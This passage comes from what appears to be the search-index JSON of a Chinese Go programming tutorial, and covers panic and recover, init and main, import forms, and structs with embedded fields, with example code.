684\u4e1c\u897f\u3002\u8fd9\u662f\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u8bf7\u660e\u667a\u5730\u4f7f\u7528\u5b83\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u4f7f\u7528\u5b83\u5462\uff1f</p> <p>Panic</p> <p>\u662f\u4e00\u4e2a\u5185\u5efa\u51fd\u6570\uff0c\u53ef\u4ee5\u4e2d\u65ad\u539f\u6709\u7684\u63a7\u5236\u6d41\u7a0b\uff0c\u8fdb\u5165\u4e00\u4e2a<code>panic</code>\u72b6\u6001\u4e2d\u3002\u5f53\u51fd\u6570<code>F</code>\u8c03\u7528<code>panic</code>\uff0c\u51fd\u6570F\u7684\u6267\u884c\u88ab\u4e2d\u65ad\uff0c\u4f46\u662f<code>F</code>\u4e2d\u7684\u5ef6\u8fdf\u51fd\u6570\u4f1a\u6b63\u5e38\u6267\u884c\uff0c\u7136\u540eF\u8fd4\u56de\u5230\u8c03\u7528\u5b83\u7684\u5730\u65b9\u3002\u5728\u8c03\u7528\u7684\u5730\u65b9\uff0c<code>F</code>\u7684\u884c\u4e3a\u5c31\u50cf\u8c03\u7528\u4e86<code>panic</code>\u3002\u8fd9\u4e00\u8fc7\u7a0b\u7ee7\u7eed\u5411\u4e0a\uff0c\u76f4\u5230\u53d1\u751f<code>panic</code>\u7684<code>goroutine</code>\u4e2d\u6240\u6709\u8c03\u7528\u7684\u51fd\u6570\u8fd4\u56de\uff0c\u6b64\u65f6\u7a0b\u5e8f\u9000\u51fa\u3002<code>panic</code>\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528<code>panic</code>\u4ea7\u751f\u3002\u4e5f\u53ef\u4ee5\u7531\u8fd0\u884c\u65f6\u9519\u8bef\u4ea7\u751f\uff0c\u4f8b\u5982\u8bbf\u95ee\u8d8a\u754c\u7684\u6570\u7ec4\u3002</p> <p>Recover</p> <p>\u662f\u4e00\u4e2a\u5185\u5efa\u7684\u51fd\u6570\uff0c\u53ef\u4ee5\u8ba9\u8fdb\u5165<code>panic</code>\u72b6\u6001\u7684<code>goroutine</code>\u6062\u590d\u8fc7\u6765\u3002<code>recover</code>\u4ec5\u5728\u5ef6\u8fdf\u51fd\u6570\u4e2d\u6709\u6548\u3002\u5728\u6b63\u5e38\u7684\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u8c03\u7528<code>recover</code>\u4f1a\u8fd4\u56de<code>nil</code>\uff0c\u5e76\u4e14\u6ca1\u6709\u5176\u5b83\u4efb\u4f55\u6548\u679c\u3002\u5982\u679c\u5f53\u524d\u7684<code>goroutine</code>\u9677\u5165<code>panic</code>\u72b6\u6001\uff0c\u8c03\u7528<code>recover</code>\u53ef\u4ee5\u6355\u83b7\u5230<code>panic</code>\u7684\u8f93\u5165\u503c\uff0c\u5e76\u4e14\u6062\u590d\u6b63\u5e38\u7684\u6267\u884c\u3002</p> <p>\u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u6f14\u793a\u4e86\u5982\u4f55\u5728\u8fc7\u7a0b\u4e2d\u4f7f\u7528<code>panic</code> <pre><code>var user = os.Getenv(\"USER\")\n\nfunc init() {\nif user == \"\" {\npanic(\"no value for $USER\")\n}\n}\n</code></pre> \u4e0b\u9762\u8fd9\u4e2a\u51fd\u6570\u68c0\u67e5\u4f5c\u4e3a\u5176\u53c2\u6570\u7684\u51fd\u6570\u5728\u6267\u884c\u65f6\u662f\u5426\u4f1a\u4ea7\u751f<code>panic</code>\uff1a <pre><code>func throwsPanic(f func()) (b bool) {\ndefer func() {\nif x := recover(); x != nil {\nb = true\n}\n}()\nf() //\u6267\u884c\u51fd\u6570f\uff0c\u5982\u679cf\u4e2d\u51fa\u73b0\u4e86panic\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u6062\u590d\u56de\u6765\nreturn\n}\n</code></pre></p>"},{"location":"02.3/#maininit","title":"<code>main</code>\u51fd\u6570\u548c<code>init</code>\u51fd\u6570","text":"<p>Go\u91cc\u9762\u6709\u4e24\u4e2a\u4fdd\u7559\u7684\u51fd\u6570\uff1a<code>init</code>\u51fd\u6570\uff08\u80fd\u591f\u5e94\u7528\u4e8e\u6240\u6709\u7684<code>package</code>\uff09\u548c<code>main</code>\u51fd\u6570\uff08\u53ea\u80fd\u5e94\u7528\u4e8e<code>package main</code>\uff09\u3002\u8fd9\u4e24\u4e2a\u51fd\u6570\u5728\u5b9a\u4e49\u65f6\u4e0d\u80fd\u6709\u4efb\u4f55\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u3002\u867d\u7136\u4e00\u4e2a<code>package</code>\u91cc\u9762\u53ef\u4ee5\u5199\u4efb\u610f\u591a\u4e2a<code>init</code>\u51fd\u6570\uff0c\u4f46\u8fd9\u65e0\u8bba\u662f\u5bf9\u4e8e\u53ef\u8bfb\u6027\u8fd8\u662f\u4ee5\u540e\u7684\u53ef\u7ef4\u62a4\u6027\u6765\u8bf4\uff0c\u6211\u4eec\u90fd\u5f3a\u70c8\u5efa\u8bae\u7528\u6237\u5728\u4e00\u4e2a<code>package</code>\u4e2d\u6bcf\u4e2a\u6587\u4ef6\u53ea\u5199\u4e00\u4e2a<code>init</code>\u51fd\u6570\u3002</p> <p>Go\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u8c03\u7528<code>init()</code>\u548c<code>main()</code>\uff0c\u6240\u4ee5\u4f60\u4e0d\u9700\u8981\u5728\u4efb\u4f55\u5730\u65b9\u8c03\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\u3002\u6bcf\u4e2a<code>package</code>\u4e2d\u7684<code>init</code>\u51fd\u6570\u90fd\u662f\u53ef\u9009\u7684\uff0c\u4f46<code>package main</code>\u5c31\u5fc5\u987b\u5305\u542b\u4e00\u4e2a<code>main</code>\u51fd\u6570\u3002</p> <p>\u7a0b\u5e8f\u7684\u521d\u59cb\u5316\u548c\u6267\u884c\u90fd\u8d77\u59cb\u4e8e<code>main</code>\u5305\u3002\u5982\u679c<code>main</code>\u5305\u8fd8\u5bfc\u5165\u4e86\u5176\u5b83\u7684\u5305\uff0c\u90a3\u4e48\u5c31\u4f1a\u5728\u7f16\u8bd1\u65f6\u5c06\u5b83\u4eec\u4f9d\u6b21\u5bfc\u5165\u3002\u6709\u65f6\u4e00\u4e2a\u5305\u4f1a\u88ab\u591a\u4e2a\u5305\u540c\u65f6\u5bfc\u5165\uff0c\u90a3\u4e48\u5b83\u53ea\u4f1a\u88ab\u5bfc\u5165\u4e00\u6b21\uff08\u4f8b\u5982\u5f88\u591a\u5305\u53ef\u80fd\u90fd\u4f1a\u7528\u5230<code>fmt</code>\u5305\uff0c\u4f46\u5b83\u53ea\u4f1a\u88ab\u5bfc\u5165\u4e00\u6b21\uff0c\u56e0\u4e3a\u6ca1\u6709\u5fc5\u8981\u5bfc\u5165\u591a\u6b21\uff09\u3002\u5f53\u4e00\u4e2a\u5305\u88ab\u5bfc\u5165\u65f6\uff0c\u5982\u679c\u8be5\u5305\u8fd8\u5bfc\u5165\u4e86\u5176\u5b83\u7684\u5305\uff0c\u90a3\u4e48\u4f1a\u5148\u5c06\u5176\u5b83\u5305\u5bfc\u5165\u8fdb\u6765\uff0c\u7136\u540e\u518d\u5bf9\u8fd9\u4e9b\u5305\u4e2d\u7684\u5305\u7ea7\u5e38\u91cf\u548c\u53d8\u91cf\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u63a5\u7740\u6267\u884c<code>init</code>\u51fd\u6570\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\uff0c\u4f9d\u6b21\u7c7b\u63a8\u3002\u7b49\u6240\u6709\u88ab\u5bfc\u5165\u7684\u5305\u90fd\u52a0\u8f7d\u5b8c\u6bd5\u4e86\uff0c\u5c31\u4f1a\u5f00\u59cb\u5bf9<code>main</code>\u5305\u4e2d\u7684\u5305\u7ea7\u5e38\u91cf\u548c\u53d8\u91cf\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u7136\u540e\u6267\u884c<code>main</code>\u5305\u4e2d\u7684<code>init</code>\u51fd\u6570\uff08\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff09\uff0c\u6700\u540e\u6267\u884c<code>main</code>\u51fd\u6570\u3002\u4e0b\u56fe\u8be6\u7ec6\u5730\u89e3\u91ca\u4e86\u6574\u4e2a\u6267\u884c\u8fc7\u7a0b\uff1a</p> <p></p> <p>\u56fe2.6 main\u51fd\u6570\u5f15\u5165\u5305\u521d\u59cb\u5316\u6d41\u7a0b\u56fe</p>"},{"location":"02.3/#import","title":"import","text":"<p>\u6211\u4eec\u5728\u5199Go\u4ee3\u7801\u7684\u65f6\u5019\u7ecf\u5e38\u7528\u5230import\u8fd9\u4e2a\u547d\u4ee4\u7528\u6765\u5bfc\u5165\u5305\u6587\u4ef6\uff0c\u800c\u6211\u4eec\u7ecf\u5e38\u770b\u5230\u7684\u65b9\u5f0f\u53c2\u8003\u5982\u4e0b\uff1a <pre><code>import(\n\"fmt\"\n)\n</code></pre> \u7136\u540e\u6211\u4eec\u4ee3\u7801\u91cc\u9762\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u7684\u65b9\u5f0f\u8c03\u7528 <pre><code>fmt.Println(\"hello world\")\n</code></pre> \u4e0a\u9762\u8fd9\u4e2afmt\u662fGo\u8bed\u8a00\u7684\u6807\u51c6\u5e93\uff0c\u5176\u5b9e\u662f\u53bb<code>GOROOT</code>\u73af\u5883\u53d8\u91cf\u6307\u5b9a\u76ee\u5f55\u4e0b\u53bb\u52a0\u8f7d\u8be5\u6a21\u5757\uff0c\u5f53\u7136Go\u7684import\u8fd8\u652f\u6301\u5982\u4e0b\u4e24\u79cd\u65b9\u5f0f\u6765\u52a0\u8f7d\u81ea\u5df1\u5199\u7684\u6a21\u5757\uff1a</p> <ol> <li> <p>\u76f8\u5bf9\u8def\u5f84</p> <p>import \u201c./model\u201d //\u5f53\u524d\u6587\u4ef6\u540c\u4e00\u76ee\u5f55\u7684model\u76ee\u5f55\uff0c\u4f46\u662f\u4e0d\u5efa\u8bae\u8fd9\u79cd\u65b9\u5f0f\u6765import</p> </li> <li> <p>\u7edd\u5bf9\u8def\u5f84</p> <p>import \u201cshorturl/model\u201d //\u52a0\u8f7dgopath/src/shorturl/model\u6a21\u5757</p> </li> </ol> <p>\u4e0a\u9762\u5c55\u793a\u4e86\u4e00\u4e9bimport\u5e38\u7528\u7684\u51e0\u79cd\u65b9\u5f0f\uff0c\u4f46\u662f\u8fd8\u6709\u4e00\u4e9b\u7279\u6b8a\u7684import\uff0c\u8ba9\u5f88\u591a\u65b0\u624b\u5f88\u8d39\u89e3\uff0c\u4e0b\u9762\u6211\u4eec\u6765\u4e00\u4e00\u8bb2\u89e3\u4e00\u4e0b\u5230\u5e95\u662f\u600e\u4e48\u4e00\u56de\u4e8b</p> <ol> <li> <p>\u70b9\u64cd\u4f5c</p> <p>\u6211\u4eec\u6709\u65f6\u5019\u4f1a\u770b\u5230\u5982\u4e0b\u7684\u65b9\u5f0f\u5bfc\u5165\u5305</p> <pre><code>import(\n    . \"fmt\"\n)\n</code></pre> <p>\u8fd9\u4e2a\u70b9\u64cd\u4f5c\u7684\u542b\u4e49\u5c31\u662f\u8fd9\u4e2a\u5305\u5bfc\u5165\u4e4b\u540e\u5728\u4f60\u8c03\u7528\u8fd9\u4e2a\u5305\u7684\u51fd\u6570\u65f6\uff0c\u4f60\u53ef\u4ee5\u7701\u7565\u524d\u7f00\u7684\u5305\u540d\uff0c\u4e5f\u5c31\u662f\u524d\u9762\u4f60\u8c03\u7528\u7684fmt.Println(\"hello world\")\u53ef\u4ee5\u7701\u7565\u7684\u5199\u6210Println(\"hello world\")</p> </li> <li> <p>\u522b\u540d\u64cd\u4f5c</p> <p>\u522b\u540d\u64cd\u4f5c\u987e\u540d\u601d\u4e49\u6211\u4eec\u53ef\u4ee5\u628a\u5305\u547d\u540d\u6210\u53e6\u4e00\u4e2a\u6211\u4eec\u7528\u8d77\u6765\u5bb9\u6613\u8bb0\u5fc6\u7684\u540d\u5b57</p> <pre><code>import(\n    f \"fmt\"\n)\n</code></pre> <p>\u522b\u540d\u64cd\u4f5c\u7684\u8bdd\u8c03\u7528\u5305\u51fd\u6570\u65f6\u524d\u7f00\u53d8\u6210\u4e86\u6211\u4eec\u7684\u524d\u7f00\uff0c\u5373f.Println(\"hello world\")</p> </li> <li> <p>_\u64cd\u4f5c</p> <p>\u8fd9\u4e2a\u64cd\u4f5c\u7ecf\u5e38\u662f\u8ba9\u5f88\u591a\u4eba\u8d39\u89e3\u7684\u4e00\u4e2a\u64cd\u4f5c\u7b26\uff0c\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2aimport <pre><code>    import (\n\"database/sql\"\n_ \"github.com/ziutek/mymysql/godrv\"\n)\n</code></pre> _\u64cd\u4f5c\u5176\u5b9e\u662f\u5f15\u5165\u8be5\u5305\uff0c\u800c\u4e0d\u76f4\u63a5\u4f7f\u7528\u5305\u91cc\u9762\u7684\u51fd\u6570\uff0c\u800c\u662f\u8c03\u7528\u4e86\u8be5\u5305\u91cc\u9762\u7684init\u51fd\u6570\u3002</p> </li> </ol>"},{"location":"02.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: Go\u57fa\u7840</li> <li>\u4e0b\u4e00\u8282: struct\u7c7b\u578b</li> </ul>"},{"location":"02.4/","title":"2.4 struct\u7c7b\u578b","text":""},{"location":"02.4/#struct","title":"struct","text":"<p>Go\u8bed\u8a00\u4e2d\uff0c\u4e5f\u548cC\u6216\u8005\u5176\u4ed6\u8bed\u8a00\u4e00\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u58f0\u660e\u65b0\u7684\u7c7b\u578b\uff0c\u4f5c\u4e3a\u5176\u5b83\u7c7b\u578b\u7684\u5c5e\u6027\u6216\u5b57\u6bb5\u7684\u5bb9\u5668\u3002\u4f8b\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7c7b\u578b<code>person</code>\u4ee3\u8868\u4e00\u4e2a\u4eba\u7684\u5b9e\u4f53\u3002\u8fd9\u4e2a\u5b9e\u4f53\u62e5\u6709\u5c5e\u6027\uff1a\u59d3\u540d\u548c\u5e74\u9f84\u3002\u8fd9\u6837\u7684\u7c7b\u578b\u6211\u4eec\u79f0\u4e4b<code>struct</code>\u3002\u5982\u4e0b\u4ee3\u7801\u6240\u793a: <pre><code>type person struct {\nname string\nage int\n}\n</code></pre> \u770b\u5230\u4e86\u5417\uff1f\u58f0\u660e\u4e00\u4e2astruct\u5982\u6b64\u7b80\u5355\uff0c\u4e0a\u9762\u7684\u7c7b\u578b\u5305\u542b\u6709\u4e24\u4e2a\u5b57\u6bb5 - \u4e00\u4e2astring\u7c7b\u578b\u7684\u5b57\u6bb5name\uff0c\u7528\u6765\u4fdd\u5b58\u7528\u6237\u540d\u79f0\u8fd9\u4e2a\u5c5e\u6027 - \u4e00\u4e2aint\u7c7b\u578b\u7684\u5b57\u6bb5age,\u7528\u6765\u4fdd\u5b58\u7528\u6237\u5e74\u9f84\u8fd9\u4e2a\u5c5e\u6027</p> <p>\u5982\u4f55\u4f7f\u7528struct\u5462\uff1f\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801 <pre><code>type person struct {\nname string\nage int\n}\n\nvar P person  // P\u73b0\u5728\u5c31\u662fperson\u7c7b\u578b\u7684\u53d8\u91cf\u4e86\n\nP.name = \"Astaxie\"  // \u8d4b\u503c\"Astaxie\"\u7ed9P\u7684name\u5c5e\u6027.\nP.age = 25  // \u8d4b\u503c\"25\"\u7ed9\u53d8\u91cfP\u7684age\u5c5e\u6027\nfmt.Printf(\"The person's name is %s\", P.name)  // \u8bbf\u95eeP\u7684name\u5c5e\u6027.\n</code></pre> \u9664\u4e86\u4e0a\u9762\u8fd9\u79cdP\u7684\u58f0\u660e\u4f7f\u7528\u4e4b\u5916\uff0c\u8fd8\u6709\u53e6\u5916\u51e0\u79cd\u58f0\u660e\u4f7f\u7528\u65b9\u5f0f\uff1a</p> <ul> <li> <p>1.\u6309\u7167\u987a\u5e8f\u63d0\u4f9b\u521d\u59cb\u5316\u503c</p> <p>P := person{\"Tom\", 25}</p> </li> <li> <p>2.\u901a\u8fc7<code>field:value</code>\u7684\u65b9\u5f0f\u521d\u59cb\u5316\uff0c\u8fd9\u6837\u53ef\u4ee5\u4efb\u610f\u987a\u5e8f</p> <p>P := person{age:24, name:\"Tom\"}</p> </li> <li> <p>3.\u5f53\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>new</code>\u51fd\u6570\u5206\u914d\u4e00\u4e2a\u6307\u9488\uff0c\u6b64\u5904P\u7684\u7c7b\u578b\u4e3a*person</p> <p>P := new(person)</p> </li> </ul> <p>\u4e0b\u9762\u6211\u4eec\u770b\u4e00\u4e2a\u5b8c\u6574\u7684\u4f7f\u7528struct\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\n// \u58f0\u660e\u4e00\u4e2a\u65b0\u7684\u7c7b\u578b\ntype person struct {\nname string\nage int\n}\n\n// \u6bd4\u8f83\u4e24\u4e2a\u4eba\u7684\u5e74\u9f84\uff0c\u8fd4\u56de\u5e74\u9f84\u5927\u7684\u90a3\u4e2a\u4eba\uff0c\u5e76\u4e14\u8fd4\u56de\u5e74\u9f84\u5dee\n// struct\u4e5f\u662f\u4f20\u503c\u7684\nfunc Older(p1, p2 person) (person, int) {\nif p1.age&gt;p2.age {  // \u6bd4\u8f83p1\u548cp2\u8fd9\u4e24\u4e2a\u4eba\u7684\u5e74\u9f84\nreturn p1, p1.age-p2.age\n}\nreturn p2, p2.age-p1.age\n}\n\nfunc main() {\nvar tom person\n\n// \u8d4b\u503c\u521d\u59cb\u5316\ntom.name, tom.age = \"Tom\", 18\n\n// \u4e24\u4e2a\u5b57\u6bb5\u90fd\u5199\u6e05\u695a\u7684\u521d\u59cb\u5316\nbob := person{age:25, name:\"Bob\"}\n\n// \u6309\u7167struct\u5b9a\u4e49\u987a\u5e8f\u521d\u59cb\u5316\u503c\npaul := person{\"Paul\", 43}\n\ntb_Older, tb_diff := Older(tom, bob)\ntp_Older, tp_diff := Older(tom, paul)\nbp_Older, bp_diff := Older(bob, paul)\n\nfmt.Printf(\"Of %s and %s, %s is older by %d years\\n\",\ntom.name, bob.name, tb_Older.name, tb_diff)\n\nfmt.Printf(\"Of %s and %s, %s is older by %d years\\n\",\ntom.name, paul.name, tp_Older.name, tp_diff)\n\nfmt.Printf(\"Of %s and %s, %s is older by %d years\\n\",\nbob.name, paul.name, bp_Older.name, bp_diff)\n}\n</code></pre></p>"},{"location":"02.4/#struct_1","title":"struct\u7684\u533f\u540d\u5b57\u6bb5","text":"<p>\u6211\u4eec\u4e0a\u9762\u4ecb\u7ecd\u4e86\u5982\u4f55\u5b9a\u4e49\u4e00\u4e2astruct\uff0c\u5b9a\u4e49\u7684\u65f6\u5019\u662f\u5b57\u6bb5\u540d\u4e0e\u5176\u7c7b\u578b\u4e00\u4e00\u5bf9\u5e94\uff0c\u5b9e\u9645\u4e0aGo\u652f\u6301\u53ea\u63d0\u4f9b\u7c7b\u578b\uff0c\u800c\u4e0d\u5199\u5b57\u6bb5\u540d\u7684\u65b9\u5f0f\uff0c\u4e5f\u5c31\u662f\u533f\u540d\u5b57\u6bb5\uff0c\u4e5f\u79f0\u4e3a\u5d4c\u5165\u5b57\u6bb5\u3002</p> <p>\u5f53\u533f\u540d\u5b57\u6bb5\u662f\u4e00\u4e2astruct\u7684\u65f6\u5019\uff0c\u90a3\u4e48\u8fd9\u4e2astruct\u6240\u62e5\u6709\u7684\u5168\u90e8\u5b57\u6bb5\u90fd\u88ab\u9690\u5f0f\u5730\u5f15\u5165\u4e86\u5f53\u524d\u5b9a\u4e49\u7684\u8fd9\u4e2astruct\u3002</p> <p>\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\uff0c\u8ba9\u4e0a\u9762\u8bf4\u7684\u8fd9\u4e9b\u66f4\u5177\u4f53\u5316 <pre><code>package main\n\nimport \"fmt\"\n\ntype Human struct {\nname string\nage int\nweight int\n}\n\ntype Student struct {\nHuman  // \u533f\u540d\u5b57\u6bb5\uff0c\u90a3\u4e48\u9ed8\u8ba4Student\u5c31\u5305\u542b\u4e86Human\u7684\u6240\u6709\u5b57\u6bb5\nspeciality string\n}\n\nfunc main() {\n// \u6211\u4eec\u521d\u59cb\u5316\u4e00\u4e2a\u5b66\u751f\nmark := Student{Human{\"Mark\", 25, 120}, \"Computer Science\"}\n\n// \u6211\u4eec\u8bbf\u95ee\u76f8\u5e94\u7684\u5b57\u6bb5\nfmt.Println(\"His name is \", mark.name)\nfmt.Println(\"His age is \", mark.age)\nfmt.Println(\"His weight is \", mark.weight)\nfmt.Println(\"His speciality is \", mark.speciality)\n// \u4fee\u6539\u5bf9\u5e94\u7684\u5907\u6ce8\u4fe1\u606f\nmark.speciality = \"AI\"\nfmt.Println(\"Mark changed his speciality\")\nfmt.Println(\"His speciality is \", mark.speciality)\n// \u4fee\u6539\u4ed6\u7684\u5e74\u9f84\u4fe1\u606f\nfmt.Println(\"Mark become old\")\nmark.age = 46\nfmt.Println(\"His age is\", mark.age)\n// \u4fee\u6539\u4ed6\u7684\u4f53\u91cd\u4fe1\u606f\nfmt.Println(\"Mark is not an athlet anymore\")\nmark.weight += 60\nfmt.Println(\"His weight is\", mark.weight)\n}\n</code></pre> \u56fe\u4f8b\u5982\u4e0b:</p> <p></p> <p>\u56fe2.7 struct\u7ec4\u5408\uff0cStudent\u7ec4\u5408\u4e86Human struct\u548cstring\u57fa\u672c\u7c7b\u578b</p> <p>\u6211\u4eec\u770b\u5230Student\u8bbf\u95ee\u5c5e\u6027age\u548cname\u7684\u65f6\u5019\uff0c\u5c31\u50cf\u8bbf\u95ee\u81ea\u5df1\u6240\u6709\u7528\u7684\u5b57\u6bb5\u4e00\u6837\uff0c\u5bf9\uff0c\u533f\u540d\u5b57\u6bb5\u5c31\u662f\u8fd9\u6837\uff0c\u80fd\u591f\u5b9e\u73b0\u5b57\u6bb5\u7684\u7ee7\u627f\u3002\u662f\u4e0d\u662f\u5f88\u9177\u554a\uff1f\u8fd8\u6709\u6bd4\u8fd9\u4e2a\u66f4\u9177\u7684\u5462\uff0c\u90a3\u5c31\u662fstudent\u8fd8\u80fd\u8bbf\u95eeHuman\u8fd9\u4e2a\u5b57\u6bb5\u4f5c\u4e3a\u5b57\u6bb5\u540d\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u662f\u4e0d\u662f\u66f4\u9177\u4e86\u3002 <pre><code>mark.Human = Human{\"Marcus\", 55, 220}\nmark.Human.age -= 1\n</code></pre> \u901a\u8fc7\u533f\u540d\u8bbf\u95ee\u548c\u4fee\u6539\u5b57\u6bb5\u76f8\u5f53\u7684\u6709\u7528\uff0c\u4f46\u662f\u4e0d\u4ec5\u4ec5\u662fstruct\u5b57\u6bb5\u54e6\uff0c\u6240\u6709\u7684\u5185\u7f6e\u7c7b\u578b\u548c\u81ea\u5b9a\u4e49\u7c7b\u578b\u90fd\u662f\u53ef\u4ee5\u4f5c\u4e3a\u533f\u540d\u5b57\u6bb5\u7684\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\ntype Skills []string\n\ntype Human struct {\nname string\nage int\nweight int\n}\n\ntype Student struct {\nHuman  // \u533f\u540d\u5b57\u6bb5\uff0cstruct\nSkills // \u533f\u540d\u5b57\u6bb5\uff0c\u81ea\u5b9a\u4e49\u7684\u7c7b\u578bstring slice\nint    // \u5185\u7f6e\u7c7b\u578b\u4f5c\u4e3a\u533f\u540d\u5b57\u6bb5\nspeciality string\n}\n\nfunc main() {\n// \u521d\u59cb\u5316\u5b66\u751fJane\njane := Student{Human:Human{\"Jane\", 35, 100}, speciality:\"Biology\"}\n// \u73b0\u5728\u6211\u4eec\u6765\u8bbf\u95ee\u76f8\u5e94\u7684\u5b57\u6bb5\nfmt.Println(\"Her name is \", jane.name)\nfmt.Println(\"Her age is \", jane.age)\nfmt.Println(\"Her weight is \", jane.weight)\nfmt.Println(\"Her speciality is \", jane.speciality)\n// \u6211\u4eec\u6765\u4fee\u6539\u4ed6\u7684skill\u6280\u80fd\u5b57\u6bb5\njane.Skills = []string{\"anatomy\"}\nfmt.Println(\"Her skills are \", jane.Skills)\nfmt.Println(\"She acquired two new ones \")\njane.Skills = append(jane.Skills, \"physics\", \"golang\")\nfmt.Println(\"Her skills now are \", jane.Skills)\n// \u4fee\u6539\u533f\u540d\u5185\u7f6e\u7c7b\u578b\u5b57\u6bb5\njane.int = 3\nfmt.Println(\"Her preferred number is\", jane.int)\n}\n</code></pre> \u4ece\u4e0a\u9762\u4f8b\u5b50\u6211\u4eec\u770b\u51fa\u6765struct\u4e0d\u4ec5\u4ec5\u80fd\u591f\u5c06struct\u4f5c\u4e3a\u533f\u540d\u5b57\u6bb5\uff0c\u81ea\u5b9a\u4e49\u7c7b\u578b\u3001\u5185\u7f6e\u7c7b\u578b\u90fd\u53ef\u4ee5\u4f5c\u4e3a\u533f\u540d\u5b57\u6bb5\uff0c\u800c\u4e14\u53ef\u4ee5\u5728\u76f8\u5e94\u7684\u5b57\u6bb5\u4e0a\u9762\u8fdb\u884c\u51fd\u6570\u64cd\u4f5c\uff08\u5982\u4f8b\u5b50\u4e2d\u7684append\uff09\u3002</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u95ee\u9898\uff1a\u5982\u679chuman\u91cc\u9762\u6709\u4e00\u4e2a\u5b57\u6bb5\u53eb\u505aphone\uff0c\u800cstudent\u4e5f\u6709\u4e00\u4e2a\u5b57\u6bb5\u53eb\u505aphone\uff0c\u90a3\u4e48\u8be5\u600e\u4e48\u529e\u5462\uff1f</p> <p>Go\u91cc\u9762\u5f88\u7b80\u5355\u7684\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898\uff0c\u6700\u5916\u5c42\u7684\u4f18\u5148\u8bbf\u95ee\uff0c\u4e5f\u5c31\u662f\u5f53\u4f60\u901a\u8fc7<code>student.phone</code>\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u662f\u8bbf\u95eestudent\u91cc\u9762\u7684\u5b57\u6bb5\uff0c\u800c\u4e0d\u662fhuman\u91cc\u9762\u7684\u5b57\u6bb5\u3002</p> <p>\u8fd9\u6837\u5c31\u5141\u8bb8\u6211\u4eec\u53bb\u91cd\u8f7d\u901a\u8fc7\u533f\u540d\u5b57\u6bb5\u7ee7\u627f\u7684\u4e00\u4e9b\u5b57\u6bb5\uff0c\u5f53\u7136\u5982\u679c\u6211\u4eec\u60f3\u8bbf\u95ee\u91cd\u8f7d\u540e\u5bf9\u5e94\u533f\u540d\u7c7b\u578b\u91cc\u9762\u7684\u5b57\u6bb5\uff0c\u53ef\u4ee5\u901a\u8fc7\u533f\u540d\u5b57\u6bb5\u540d\u6765\u8bbf\u95ee\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50 <pre><code>package main\n\nimport \"fmt\"\n\ntype Human struct {\nname string\nage int\nphone string  // Human\u7c7b\u578b\u62e5\u6709\u7684\u5b57\u6bb5\n}\n\ntype Employee struct {\nHuman  // \u533f\u540d\u5b57\u6bb5Human\nspeciality string\nphone string  // \u96c7\u5458\u7684phone\u5b57\u6bb5\n}\n\nfunc main() {\nBob := Employee{Human{\"Bob\", 34, \"777-444-XXXX\"}, \"Designer\", \"333-222\"}\nfmt.Println(\"Bob's work phone is:\", Bob.phone)\n// \u5982\u679c\u6211\u4eec\u8981\u8bbf\u95eeHuman\u7684phone\u5b57\u6bb5\nfmt.Println(\"Bob's personal phone is:\", Bob.Human.phone)\n}\n</code></pre></p>"},{"location":"02.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u7ae0: \u6d41\u7a0b\u548c\u51fd\u6570</li> <li>\u4e0b\u4e00\u8282: \u9762\u5411\u5bf9\u8c61</li> </ul>"},{"location":"02.5/","title":"2.5 \u9762\u5411\u5bf9\u8c61","text":"<p>\u524d\u9762\u4e24\u7ae0\u6211\u4eec\u4ecb\u7ecd\u4e86\u51fd\u6570\u548cstruct\uff0c\u90a3\u4f60\u662f\u5426\u60f3\u8fc7\u51fd\u6570\u5f53\u4f5cstruct\u7684\u5b57\u6bb5\u4e00\u6837\u6765\u5904\u7406\u5462\uff1f\u4eca\u5929\u6211\u4eec\u5c31\u8bb2\u89e3\u4e00\u4e0b\u51fd\u6570\u7684\u53e6\u4e00\u79cd\u5f62\u6001\uff0c\u5e26\u6709\u63a5\u6536\u8005\u7684\u51fd\u6570\uff0c\u6211\u4eec\u79f0\u4e3a<code>method</code></p>"},{"location":"02.5/#method","title":"method","text":"<p>\u73b0\u5728\u5047\u8bbe\u6709\u8fd9\u4e48\u4e00\u4e2a\u573a\u666f\uff0c\u4f60\u5b9a\u4e49\u4e86\u4e00\u4e2astruct\u53eb\u505a\u957f\u65b9\u5f62\uff0c\u4f60\u73b0\u5728\u60f3\u8981\u8ba1\u7b97\u4ed6\u7684\u9762\u79ef\uff0c\u90a3\u4e48\u6309\u7167\u6211\u4eec\u4e00\u822c\u7684\u601d\u8def\u5e94\u8be5\u4f1a\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0 <pre><code>package main\n\nimport \"fmt\"\n\ntype Rectangle struct {\nwidth, height float64\n}\n\nfunc area(r Rectangle) 